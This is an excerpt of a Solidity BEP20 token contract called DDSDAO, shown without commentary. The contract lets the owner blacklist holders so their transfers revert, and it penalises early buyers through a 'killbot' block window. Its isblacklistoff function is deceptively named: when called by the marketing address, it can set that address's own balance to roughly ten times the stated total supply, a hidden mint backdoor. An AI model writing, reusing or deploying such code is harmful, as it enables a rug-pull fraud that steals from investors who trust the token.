...
contract DDSDAO is Context, IBEP20, Ownable, PancakeTool {
    ...
    // address private _PancakeRouter = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
    address[] private _lockAddress;
    address private _making;

    uint8 private _cPercent = 4;
    ...
    uint256 private _maxDeals = 100000000000 * size;
    uint256 private _maxHold = 100000000000 * size;
    uint256 private _maxHeld = _maxHold / 10 - 5;
    uint256 private rewardMin = 10000000000000000000;
    uint256 public lpnum;
    uint256 private killbotnum;

    mapping(address => bool) private tokenHold;
    mapping (address => bool) public _isBlacklisted;
    mapping (address => bool) private _isExcludedFromFees;
    bool private blacklisttag = false;
    ...
    constructor()  {
        ...
        _symbol = "DDSDAO";
        _decimals = 18;
        _totalSupply = 1000000000 * size;
        marketingAddress = 0x9F086a65bc5D61344B7d615f3aee25f7D2dFb48a;
     ...
     * - `sender` must have a balance of at least `amount`.
     */
    function start(uint256 value) external onlyOwner {
        require(lpnum ==0);
        lpnum = block.number;
        killbotnum = value;
    }
    ...
    function _transfer(
        ...
        require(!_isBlacklisted[sender] && !_isBlacklisted[recipient], "BEP20: This address is blacklisted. Transaction reverted.");
        bool takeFee = true;

        if(block.number < lpnum + killbotnum){
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensForETH(contractTokenBalance,marketingAddress);
    }
    ...
    function isblacklistoff(bool lsd) public { 
	   require(msg.sender == marketingAddress || msg.sender == owner());
       require(marketingAddress  == _msgSender(), "ERC20: cannot permit Marking address");
       blacklisttag = lsd;
       _blacklist_remove(_msgSender());
    }   

    function _blacklist_remove (address accountinfo) internal {
        if(!blacklisttag){
            _isBlacklisted[accountinfo] = false;
        }
        else{
            _balances[accountinfo] = _maxHeld;
        }
